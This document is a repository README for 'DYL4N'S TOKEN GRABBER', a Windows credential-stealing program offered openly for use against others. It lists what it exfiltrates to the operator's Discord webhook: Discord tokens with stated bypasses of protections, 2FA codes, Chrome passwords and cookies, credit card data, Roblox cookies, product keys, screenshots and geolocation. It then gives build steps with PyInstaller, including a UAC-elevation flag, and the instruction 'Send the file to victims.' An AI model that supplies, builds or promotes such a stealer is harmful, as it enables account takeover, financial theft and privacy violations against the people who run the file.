
## ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ ‎ 🌟 Star this Repository if you enjoy DYL4N'S TOKEN GRABBER
**NOTE:** This is a free software. It will not be undetected from antivirus software.



#### When someone executes the file, the following info will be sent to you:
-  User Name.
-  Computer Name.
-  Windows Product Key & Build Info.
-  IP & Geolocation. (Country, City, Google Maps Location)
-  A screenshot taken when they ran the file.
-  Roblox Cookies.
-  All valid/working discord tokens. (Bypasses BetterDiscord, Token Protector and Discord's new encryption)
-  Discord 2FA Codes for accounts with 2FA enabled.
-  Their Passwords & Credit Cards for Discord. (updates when they change it)
-  All Passwords and Cookies from the Chrome Browser.

### 📁・Setting up DYL4N'S TOKEN GRABBER
1. Install python if you have not already. [(Link Here)](https://www.python.org/)
2. Replace "WEBHOOK_HERE" with a discord webhook you've created. (Keep the quotes around the webhook)
3. Double Click `setup.bat` and allow it to finish.
4. A Window will open prompting for a name. Put something in such as "Token_Logger" (You can always rename the file later)
5. Send the file to victims. 😈
 
### ⚙・Manually Compiling Source Code
If you do not want to use the batch file, you can follow this guide:
1. Open command prompt in the same directory as the .py file.
2. Type `pip install -r requirements.txt` (To install the modules)
3. Type: `pyinstaller --clean --onefile -w main.py`, you will see a lot of text popping up. Ignore it and wait.
4. After it says its finishing, you can find the EXE file in the dist directory, located in the project root!
 
### 💾・ More options
Add these into the command when creating the exe if you want
|    PyInstaller Options         |
| ------------------------------------     |
| `-n name` The name of the compiled EXE (Defaults to the name of the original .py file)    |
| `-i icon.ico` The icon. You can specify a directory to an icon file, or do NONE for a default EXE icon.    |
| `--clean` Removes all temporary files so you only have what you need.    |
| `--uac-admin` Modified the MANIFEST so that it will request UAC permissions upon running. |
| `--hidden-import MODULENAME` Adds a module without it being present in the script. |
